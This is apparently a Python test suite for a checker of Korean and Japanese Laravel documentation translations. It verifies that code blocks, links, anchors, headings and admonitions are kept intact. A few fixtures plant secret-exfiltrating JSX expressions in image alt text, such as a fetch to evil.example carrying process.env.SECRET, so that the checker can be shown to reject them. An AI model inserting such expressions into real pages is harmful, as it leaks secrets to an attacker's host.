        self.assertNotIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_code_block_content_changed(self):
        """code block 내용 변경을 감지."""

        source = """```js
// Create a user
const user = {};
```
"""
        translated = """```js
// 사용자를 생성합니다
const user = {};
```
"""

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_fence_that_consumes_the_document_tail(self):
        """문서 끝까지 소비하는 fence를 감지."""

        source = "Keep this text.\n"
        translated = (
            "<!-- Keep this text. -->\n"
            "번역문입니다.\n"
            "```\n"
            "malformed <div> and {{version}}\n"
        )

        self.assertIn(
            "code block mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_fenced_code_blocks_with_equivalent_trailing_newline(self):
        """후행 개행이 동등한 fenced code block을 허용."""

        source = """```php
echo 'ok';
```
"""
        translated = """```php
echo 'ok';
```"""

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_rejects_fenced_code_blocks_with_changed_trailing_spaces(self):
        """후행 공백이 바뀐 fenced code block을 거부."""

        source = "```php\nreturn true;    \n```\n"
        translated = "```php\nreturn true;\n```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_accepts_long_fenced_code_blocks_with_inner_shorter_fence(self):
        """내부에 더 짧은 fence가 있는 긴 fenced code block을 허용."""

        source = "````markdown\n```php\necho 'ok';\n```\n````\n"
        translated = source

        self.assertNotIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_quoted_fenced_code_content_changed(self):
        """인용된 fenced code의 내용 변경을 감지."""

        source = "> ```text\n> literal\n> ```\n"
        translated = "> ```text\n> translated\n> ```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_does_not_close_fence_at_different_blockquote_depth(self):
        """blockquote 깊이가 다른 fence를 종료 fence로 보지 않음."""

        source = "```text\n> ```\nliteral\n```\n"
        translated = "```text\n> ```\ntranslated\n```\n"

        self.assertIn("code block mismatch", verify.verify(translated, source=source))

    def test_detects_html_anchor_name_changed(self):
        """HTML anchor name 변경을 감지."""

        source = '<a name="basic-routing"></a>\n\n# Routing\n'
        translated = """<!-- <a name="basic-routing"></a> -->
<a name="기본-라우팅"></a>

<!-- # Routing -->
# 라우팅 (Routing)
"""

        self.assertIn("anchor mismatch", verify.verify(translated, source=source))

    def test_does_not_treat_data_name_as_anchor_name(self):
        """data-name을 anchor name으로 보지 않음."""

        source = '<a name="basic-routing"></a>\n'
        translated = '<a data-name="basic-routing"></a>\n'

        self.assertIn("anchor mismatch", verify.verify(translated, source=source))

    def test_detects_html_image_source_changed(self):
        """HTML image source 변경을 감지."""

        source = '<img src="/img/original.png" alt="Original"/>\n'
        translated = '<img src="/img/changed.png" alt="번역"/>\n'

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_does_not_treat_data_src_as_image_src(self):
        """data-src를 image src로 보지 않음."""

        source = '<img src="/img/original.png"/>\n'
        translated = '<img data-src="/img/original.png"/>\n'

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_ignores_translation_alias_anchors(self):
        """번역 alias anchor를 무시."""

        source = '<a name="generating-migrations"></a>\n\n# Migrations\n'
        translated = """<!-- <a name="generating-migrations"></a> -->
<a name="generating-migrations"></a>
<a name="writing-migrations" data-translation-alias="true"></a>

<!-- # Migrations -->
# 마이그레이션 (Migrations)
"""

        self.assertNotIn("anchor mismatch", verify.verify(translated, source=source))

    def test_detects_missing_original_english_comment_for_heading_or_paragraph(self):
        """heading이나 문단의 누락된 원문 영어 주석을 감지."""

        source = "# Installation\n\nInstall Laravel with Composer.\n"
        translated = "# 설치 (Installation)\n\nComposer로 Laravel을 설치합니다.\n"

        self.assertIn("missing original comment", verify.verify(translated, source=source))
        self.assertEqual(
            verify.missing_original_comments(translated, source),
            ["# Installation", "Install Laravel with Composer."],
        )

    def test_accepts_escaped_js_comment_closer_inside_original_comment(self):
        """원문 주석 안에서 escape한 JS 주석 종료자를 허용."""

        source = "Use `DB::raw(/* ... */)` carefully."
        translated = """<!-- Use `DB::raw(/* ... *&#47;)` carefully. -->
`DB::raw(/* ... */)`를 신중하게 사용합니다.
"""

        self.assertNotIn("missing original comment", verify.verify(translated, source=source))

    def test_does_not_require_comments_for_standalone_html_tags(self):
        """독립 HTML tag에는 주석을 요구하지 않음."""

        source = '<div class="grid">\n\nBody.\n\n</div>\n'
        translated = (
            '<div class="grid">\n\n'
            "<!-- Body. -->\n본문입니다.\n\n"
            "</div>\n"
        )

        self.assertNotIn(
            "missing original comment",
            verify.verify(translated, source=source),
        )

    def test_detects_missing_standalone_html_wrappers(self):
        """누락된 독립 HTML wrapper를 감지."""

        source = '<div class="content-list" markdown="1">\n\nBody.\n\n</div>\n'
        translated = "<!-- Body. -->\n본문입니다.\n"

        issues = verify.verify(translated, source=source)

        self.assertIn("html tag mismatch", issues)
        self.assertNotIn("missing original comment", issues)

    def test_accepts_blankless_html_wrappers_with_body_comment(self):
        """빈 줄 없는 HTML wrapper의 본문 주석을 허용."""

        source = '<div class="content-list">\nBody.\n</div>\n'
        translated = (
            '<div class="content-list">\n'
            "<!-- Body. -->\n본문입니다.\n"
            "</div>\n"
        )

        issues = verify.verify(translated, source=source)

        self.assertNotIn("html tag mismatch", issues)
        self.assertNotIn("missing original comment", issues)

    def test_detects_missing_multi_tag_structural_fragment(self):
        """누락된 여러 tag 구조 fragment를 감지."""

        source = '<p><img src="/img/example.png"/></p>\n'

        self.assertIn("html tag mismatch", verify.verify("", source=source))

    def test_detects_missing_inline_table_tags(self):
        """누락된 inline table tag를 감지."""

        source = "<tr><td>Command</td></tr>\n"
        translated = "<!-- <tr><td>Command</td></tr> -->\n명령\n"

        self.assertIn("html tag mismatch", verify.verify(translated, source=source))

    def test_checks_inline_tags_beside_named_anchor(self):
        """named anchor 옆의 inline tag를 검사."""

        source = '<a name="example"></a><img src="/img/example.png"/>\n'
        translated = '<a name="example"></a>\n'

        self.assertIn("html tag mismatch", verify.verify(translated, source=source))

    def test_normalizes_known_stale_link_targets_before_comparing(self):
        """비교 전에 알려진 stale link target을 정규화."""

        source = "See [Agents](#agents-integration)."
        translated = """<!-- See [Agents](#agents-integration). -->
[Agents](#agent-integration)를 참고하세요.
"""

        self.assertNotIn("link target mismatch", verify.verify(translated, source=source))

    def test_normalizes_controller_stale_target_only_after_v9(self):
        """controller의 stale target을 v9 이후에만 정규화."""

        target = "#actions-handled-by-resource-controller"

        self.assertEqual(
            verify._normalize_link_target(target, version="9.x"),
            target,
        )
        self.assertEqual(
            verify._normalize_link_target(target, version="10.x"),
            "#actions-handled-by-resource-controllers",
        )

    def test_normalizes_agents_target_only_in_v12_and_master(self):
        """agents target을 v12와 master에서만 정규화."""

        target = "#agents-integration"

        self.assertEqual(
            verify._normalize_link_target(target, version="12.x"),
            "#agent-integration",
        )
        self.assertEqual(
            verify._normalize_link_target(target, version="13.x"),
            target,
        )

    def test_normalizes_versioned_absolute_doc_links_to_relative_targets(self):
        """버전이 있는 absolute doc link를 relative target으로 정규화."""

        source = "See [Cache](cache)."
        translated = """<!-- See [Cache](cache). -->
[Cache](/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="12.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_preserves_distinct_link_target_route_classes(self):
        """서로 다른 link target route class를 보존."""

        cases = (
            ("/docs/13.x/cache", "/cache"),
            ("/docs/13.x/#intro", "#intro"),
            ("/docs/13.x/?view=all", "?view=all"),
            ("/docs/13.x//cache", "cache"),
            ("./https://example.com", "https://example.com"),
            ("./mailto:user@example.com", "mailto:user@example.com"),
        )

        for source_target, translated_target in cases:
            with self.subTest(
                source_target=source_target,
                translated_target=translated_target,
            ):
                source = f"See [Target]({source_target}).\n"
                translated = (
                    f"<!-- See [Target]({source_target}). -->\n"
                    f"[Target]({translated_target})를 참고하세요.\n"
                )

                issues = verify.verify(
                    translated,
                    source=source,
                    version="13.x",
                )

                self.assertIn("link target mismatch", issues)
                self.assertIn("link pair mismatch", issues)

    def test_normalizes_only_valid_current_version_document_paths(self):
        """유효한 현재 버전 문서 경로만 정규화."""

        cases = (
            ("cache?view=all#intro", "/docs/13.x/cache?view=all#intro"),
            (
                "cache?view=all#intro",
                "https://laravel.com/docs/13.x/cache?view=all#intro",
            ),
            ("cache", "./cache"),
        )

        for source_target, translated_target in cases:
            with self.subTest(translated_target=translated_target):
                source = f"See [Target]({source_target}).\n"
                translated = (
                    f"<!-- See [Target]({source_target}). -->\n"
                    f"[Target]({translated_target})를 참고하세요.\n"
                )

                issues = verify.verify(
                    translated,
                    source=source,
                    version="13.x",
                )

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_detects_internal_doc_link_version_drift(self):
        """내부 doc link의 버전 변경을 감지."""

        source = "See [Cache](/docs/13.x/cache)."
        translated = """<!-- See [Cache](/docs/13.x/cache). -->
[Cache](/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_laravel_absolute_doc_link_version_drift(self):
        """Laravel absolute doc link의 버전 변경을 감지."""

        source = "See [Cache](https://laravel.com/docs/13.x/cache)."
        translated = """<!-- See [Cache](https://laravel.com/docs/13.x/cache). -->
[Cache](https://laravel.com/docs/12.x/cache)를 참고하세요.
"""

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_normalizes_laravel_absolute_doc_links_to_relative_targets(self):
        """Laravel absolute doc link를 relative target으로 정규화."""

        source = "See [Cache](cache)."
        for version in ("12.x", "master"):
            with self.subTest(version=version):
                translated = (
                    "<!-- See [Cache](cache). -->\n"
                    f"[Cache](https://laravel.com/docs/{version}/cache)를 참고하세요.\n"
                )

                issues = verify.verify(translated, source=source, version=version)

                self.assertNotIn("link target mismatch", issues)
                self.assertNotIn("link pair mismatch", issues)

    def test_keeps_nonversioned_laravel_doc_urls_external(self):
        """버전이 없는 Laravel doc URL을 외부 link로 유지."""

        source = "See [Sanctum](sanctum)."
        translated = """<!-- See [Sanctum](sanctum). -->
[Sanctum](https://laravel.com/docs/sanctum)를 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_ignores_the_removed_v8_assert_similar_json_link(self):
        """본문 section이 제거된 8.x assertSimilarJson link를 비교에서 제외."""

        source = "See [assertSimilarJson](#assert-similar-json)."
        translated = f"<!-- {source} -->\n`assertSimilarJson`를 참고하세요.\n"

        issues = verify.verify(translated, source=source, version="8.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link label mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_normalizes_the_v9_shortcode_link_to_unicode_content(self):
        """9.x shortcode 목차 오타를 Unicode Content target으로 비교."""

        source = "See [Formatting](#formatting-shortcode-notifications)."
        translated = (
            f"<!-- {source} -->\n"
            "[Formatting](#unicode-content)를 참고하세요.\n"
        )

        issues = verify.verify(translated, source=source, version="9.x")

        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_does_not_ignore_unknown_missing_anchor_links(self):
        """알 수 없는 누락 anchor link를 무시하지 않음."""

        source = "See [Unknown section](#unknown-section)."
        translated = f"<!-- {source} -->\n알 수 없는 섹션을 참고하세요.\n"

        issues = verify.verify(translated, source=source)

        self.assertIn("link target mismatch", issues)
        self.assertIn("link label mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_heading_level_mismatch(self):
        """heading level 불일치를 감지."""

        source = "# Title\n\n## Install\n"
        translated = """<!-- # Title -->
# 제목 (Title)

<!-- ## Install -->
### 설치 (Install)
"""

        self.assertIn("heading mismatch", verify.verify(translated, source=source))

    def test_detects_translated_heading_text(self):
        """번역된 heading text를 감지."""

        source = "# Title\n\n## Install\n"
        translated = """<!-- # Title -->
# Title

<!-- ## Install -->
## 설치 (Install)
"""

        self.assertIn("heading text mismatch", verify.verify(translated, source=source))

    def test_detects_removed_explicit_heading_id(self):
        """삭제된 명시적 heading ID를 감지."""

        source = "# Stable {#stable-anchor}\n"
        translated = """<!-- # Stable {#stable-anchor} -->
# Stable
"""

        self.assertIn("heading text mismatch", verify.verify(translated, source=source))

    def test_detects_translated_front_matter_title(self):
        """번역된 front matter title을 감지."""

        source = "---\ntitle: Installation\n---\n\n# Installation\n"
        translated = "---\ntitle: 설치\n---\n\n<!-- # Installation -->\n# Installation\n"

        self.assertIn(
            "front matter title mismatch", verify.verify(translated, source=source)
        )

    def test_does_not_treat_later_horizontal_rule_as_front_matter(self):
        """뒤쪽 horizontal rule을 front matter로 보지 않음."""

        source = "Intro.\n\n---\n\nDetails.\n"
        translated = """<!-- Intro. -->
소개입니다.

---

상세입니다.
"""

        self.assertIn("missing original comment", verify.verify(translated, source=source))

    def test_detects_admonition_body_outside_blockquote(self):
        """blockquote 밖의 admonition 본문을 감지."""

        translated = """> [!NOTE]
<!-- Note body. -->
본문입니다.
"""

        self.assertIn("admonition body outside blockquote", verify.verify(translated))

    def test_detects_duplicated_admonition_marker(self):
        """중복된 admonition marker를 감지."""

        translated = """> [!NOTE]
> [!NOTE]
> <!-- Vector search requires the [AI SDK](/docs/13.x/ai-sdk). -->
> 벡터 검색에는 [AI SDK](/docs/13.x/ai-sdk)가 필요합니다.
"""

        self.assertIn("duplicate admonition marker", verify.verify(translated))

    def test_accepts_single_admonition_marker(self):
        """단일 admonition marker를 허용."""

        translated = """> [!NOTE]
> <!-- Vector search requires the [AI SDK](/docs/13.x/ai-sdk). -->
> 벡터 검색에는 [AI SDK](/docs/13.x/ai-sdk)가 필요합니다.
"""

        self.assertNotIn("duplicate admonition marker", verify.verify(translated))

    def test_rejects_changed_final_admonition_type(self):
        """최종 admonition type 변경을 거부."""

        source = "> [!CAUTION]\n> Protect credentials.\n"
        translated = "> [!NOTE]\n> 認証情報を保護します。\n"

        self.assertIn(
            "admonition type mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_same_final_admonition_type_from_inline_source_marker(self):
        """inline 원문 marker에서 유래한 같은 최종 admonition type을 허용."""

        source = "> [!NOTE] Protect credentials.\n"
        translated = "> [!NOTE]\n> 認証情報を保護します。\n"

        self.assertNotIn(
            "admonition type mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_final_admonition_type_in_markdown_containers(self):
        """Markdown container 안의 최종 admonition type 변경을 거부."""

        cases = (
            (
                "- > [!WARNING] Protect credentials.\n",
                "- > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "1. > [!WARNING] Protect credentials.\n",
                "1. > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                ">> [!WARNING] Protect credentials.\n",
                ">> [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]Protect credentials.\n",
                "> [!NOTE]자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]\n> Protect credentials.\n",
                "> [!warning]\n> 자격 증명을 보호합니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "admonition type mismatch",
                    verify.verify(translated, source=source),
                )

    def test_ignores_single_comment_opener_inside_inline_code(self):
        """inline code 안의 단일 주석 시작자를 무시."""

        source = "Use `<!--` literally.\n"
        translated = (
            "<!-- Use `<!--` literally. -->\n"
            "`<!--`를 그대로 사용합니다.\n"
        )

        self.assertNotIn(
            "malformed HTML comment",
            verify.verify(translated, source=source),
        )

    def test_detects_legacy_note_colon_inside_bold_text(self):
        """굵은 text 안의 기존 note colon을 감지."""

        self.assertIn(
            "legacy note marker",
            verify.verify("> **Note:** Keep this.\n"),
        )
        for marker in (
            "> **참고:** 본문입니다.\n",
            "> **注意:** 本文です。\n",
            "> **注:** 本文です。\n",
        ):
            with self.subTest(marker=marker):
                self.assertIn("legacy note marker", verify.verify(marker))

    def test_detects_every_plain_legacy_admonition_marker(self):
        """일반 text로 남은 기존 admonition marker를 모두 감지."""

        for marker in (
            "Note",
            "Tip",
            "Warning",
            "Caution",
            "Important",
            "참고",
            "注意",
            "注",
        ):
            with self.subTest(marker=marker):
                self.assertIn(
                    "legacy note marker",
                    verify.verify(f"> {marker}\n> Body.\n"),
                )

    def test_ignores_img_and_legacy_alert_syntax_inside_html_comments(self):
        """HTML 주석 안의 img와 기존 alert 문법을 무시."""

        text = (
            "<!--\n"
            "> **Note:** Keep this literal.\n"
            "> [!WARNING]\n"
            '<img src="example.png">\n'
            "-->\n"
        )

        issues = verify.verify(text, source=text, allow_source_echo=True)

        self.assertNotIn("legacy note marker", issues)
        self.assertNotIn("unclosed img tag", issues)
        self.assertNotIn("admonition body outside blockquote", issues)
        self.assertNotIn("duplicate admonition marker", issues)

    def test_handles_greater_than_in_img_attribute_when_checking_self_close(self):
        """`img` 속성의 `>` 문자가 self-closing 검사를 방해하지 않는지 검증."""

        self.assertNotIn(
            "unclosed img tag",
            verify.verify('<img src="example.png" alt="1 > 0"/>\n'),
        )
        self.assertIn(
            "unclosed img tag",
            verify.verify('<img src="example.png" alt="1 > 0">\n'),
        )

    def test_handles_greater_than_in_img_jsx_expression(self):
        """`img` JSX 표현식의 `>` 문자가 self-closing 검사를 방해하지 않는지 검증."""

        self.assertNotIn(
            "unclosed img tag",
            verify.verify("<img hidden={count > 0} />\n"),
        )
        self.assertIn(
            "unclosed img tag",
            verify.verify("<img hidden={count > 0}>\n"),
        )

    def test_rejects_changed_html_image_display_expression(self):
        """HTML image의 display 표현식 변경을 거부."""

        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + process.env.SECRET + " 状態"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_html_image_display_text_with_same_expression(self):
        """같은 표현식을 유지한 HTML image display text 번역을 허용."""

        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + labels.safe + " 状態"} />\n'
        )

        self.assertNotIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_non_image_display_attribute(self):
        """image가 아닌 display 속성의 번역을 허용."""

        source = '<Widget aria-label={"Cache lock"} />\n'
        translated = (
            '<!-- <Widget aria-label={"Cache lock"} /> -->\n'
            '<Widget aria-label={"캐시 잠금"} />\n'
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_changed_non_image_display_expression(self):
        """image가 아닌 display 표현식 변경을 거부."""

        source = (
            '<Widget aria-label={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<!-- <Widget aria-label={"Cache " + labels.safe + " status"} /> -->\n'
            '<Widget aria-label={"캐시 " + process.env.SECRET + " 상태"} />\n'
        )

        self.assertIn(
            "html display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_string_argument_in_image_display_expression(self):
        """image display 표현식의 문자열 인수 변경을 거부."""

        source = (
            '<img src="/a.png" '
            'alt={getLabel("safe") + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={getLabel("secret") + " 状態"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_image_expression_containing_regex_literal(self):
        """정규식 literal이 포함된 image 표현식의 변경을 거부."""

        source = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test(label) ? "safe" : "other"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test((fetch("https://evil.example/" '
            '+ process.env.SECRET), label)) ? "safe" : "other"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_image_expression_hidden_between_js_comments(self):
        """JS 주석 사이에 숨은 image 표현식을 거부."""

        source = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (void 0) + /* " + */ + " visible"} />\n'
        )
        translated = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (globalThis.pwned = process.env.SECRET) '
            '+ /* " + */ + " 表示"} />\n'
        )

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_quote_text_inside_image_regex_literal(self):
        """image 정규식 literal 안의 인용 text 변경을 거부."""

        source = '<img src="/a.png" alt={/a+\'SAFE\'+b/.source} />\n'
        translated = '<img src="/a.png" alt={/a+\'EVIL\'+b/.source} />\n'

        self.assertIn(
            "html image display expression mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_list_markers_dropped_in_translation(self):
        """번역에서 누락된 목록 표식을 감지."""

        source = """- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
"""
        translated = """<!--
- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
-->
[Using Eloquent](https://example.com/eloquent/) を使うとモデルを保存できます。

[Write queries](https://example.com/queries/) をビルダーで作成できます。
"""

        self.assertIn("list marker mismatch", verify.verify(translated, source=source))

    def test_accepts_preserved_list_markers(self):
        """보존된 목록 표식을 허용."""

        source = """- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
"""
        translated = """<!--
- [Using Eloquent](https://example.com/eloquent/) stores models.
- [Write queries](https://example.com/queries/) with the builder.
-->
- [Using Eloquent](https://example.com/eloquent/) を使うとモデルを保存できます。
- [Write queries](https://example.com/queries/) をビルダーで作成できます。
"""

        self.assertNotIn("list marker mismatch", verify.verify(translated, source=source))

    def test_rejects_translation_that_expands_prose_into_a_list(self):
        """산문을 목록으로 확장한 번역을 거부."""

        source = "Supported serializers include: `A`, `B`, and `C`.\n"
        translated = """<!-- Supported serializers include: `A`, `B`, and `C`. -->
지원되는 직렬화 방식:

- `A`
- `B`
- `C`
"""

        self.assertIn("list marker mismatch", verify.verify(translated, source=source))

    def test_distinguishes_source_comment_from_annotation(self):
        """원문 작성 주석과 번역 annotation의 역할을 구분."""

        source = """<!-- Same. -->

Same.
"""
        translated = """<!-- Same. -->
동일합니다.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_source_comment(self):
        """구조 위치가 바뀐 원문 작성 주석을 거부."""

        source = """<!-- keep -->

First paragraph.

Second paragraph.
"""
        translated = """<!-- First paragraph. -->
첫 번째 문단입니다.

<!-- keep -->

<!-- Second paragraph. -->
두 번째 문단입니다.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_stale_legacy_note_comment(self):
        """최종 문서에 남아 있는 기존 note 주석을 거부."""

        source = """> [!NOTE]
> Current guidance.
"""
        translated = """<!-- > **Note:** Current guidance. -->
> [!NOTE]
> 現在の案内です。
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_invalid_front_matter_description(self):
        """문자열이 아닌 front matter description을 거부."""

        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: {ko: 캐시 안내}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "front matter description invalid",
            verify.verify(translated, source=source),
        )
